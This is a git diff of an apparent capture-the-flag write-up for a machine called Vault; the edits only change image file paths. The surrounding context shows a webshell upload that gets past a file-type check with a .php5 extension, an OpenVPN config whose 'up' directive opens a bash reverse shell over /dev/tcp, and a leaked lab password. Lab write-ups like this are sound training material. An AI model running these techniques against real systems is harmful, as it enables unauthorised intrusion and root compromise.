@@ -4,7 +4,7 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (41) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Sparklays Directories
 
@@ -76,7 +76,7 @@ On the `design.html` page, all we see is this:
 
 This brings us to `changelogo.php`, which allows us to upload a file. Only image file are allowed. Obviously, we have to upload a PHP webshell somehow and bypass the file type check. I tried with multiple PHP extensions, and found that `.php5` works.
 
-<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 $ curl http://sparklays.com/sparklays/design/uploads/test1.php5?cmd=id
@@ -149,11 +149,11 @@ The page reveals a DNS server:
 
 The first link doesn't work, but the second brings us to this page where .ovpn files can be uploaded and tested.
 
-<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Googling around for possible exploits reveals that it is possible for us to gain a reverse shell using .ovpn files. First we need to find the local IP Address of the machine, which is 192.168.122.1 when inspecting `ip addr` output.
 
-<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can input the following file and run Test VPN.&#x20;
 
@@ -167,7 +167,7 @@ up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
 
 Take note that we have to use the IP address **of the machine** and not our own. With the SSH access we have, we can open a listener port and catch a root shell:
 
-<figure><img src="../../../.gitbook/assets/image (5) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here, we can grab the user flag from `/home/dave`. Then we can find more credentials for `dave` on this machine:
 
@@ -180,7 +180,7 @@ dav3gerous567
 
 We can then SSH in as `dave` on the DNS server. This helps to upgrade our shell.
 
-<figure><img src="../../../.gitbook/assets/image (44) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 We are allowed to run `sudo` on everything as `dave` within the DNS server, so regaining root permissions is easy.
 
